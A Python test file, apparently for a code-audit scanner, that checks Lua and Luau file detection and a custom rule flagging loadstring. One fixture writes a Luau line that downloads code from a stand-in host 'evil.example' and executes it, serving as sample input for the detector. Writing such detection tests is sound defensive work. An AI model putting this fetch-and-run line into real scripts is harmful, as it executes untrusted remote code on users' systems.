"""Fase 2 — Soporte Luau: discovery, deteccion de lenguaje y pipeline."""
from pathlib import Path

from src.config import CodeAuditConfig
from src.engine import CodeAuditEngine, SCAN_EXTENSIONS
from src.models import Language
from src.pattern_scanner import detect_language


def test_scan_extensions_include_lua_variants():
    assert ".lua" in SCAN_EXTENSIONS
    assert ".luau" in SCAN_EXTENSIONS


def test_detect_language_lua_variants(tmp_path):
    assert detect_language(tmp_path / "init.server.lua") == Language.LUA
    assert detect_language(tmp_path / "main.client.luau") == Language.LUAU


def test_engine_scans_luau_with_custom_rule(tmp_path):
    rules = tmp_path / "rules.yaml"
    rules.write_text(
        "\nrules:\n"
        "  - id: RBX-LOADSTRING-TEST\n"
        "    title: loadstring usage in Luau\n"
        "    severity: critical\n"
        "    category: security_misconfig\n"
        "    languages: [luau]\n"
        "    pattern: 'loadstring[(]'\n"
        "    confidence: 0.9\n"
    )
    (tmp_path / "main.luau").write_text(
        'local f = loadstring(game:HttpGet("http://evil.example/x"))()\n'
    )

    cfg = CodeAuditConfig()
    cfg.scanners.custom_rules_path = str(rules)
    engine = CodeAuditEngine(config=cfg)

    result = engine.scan(str(tmp_path))
    assert any(f.rule_id == "RBX-LOADSTRING-TEST" for f in result.findings), \
        "regla Luau no detecto loadstring en archivo .luau"
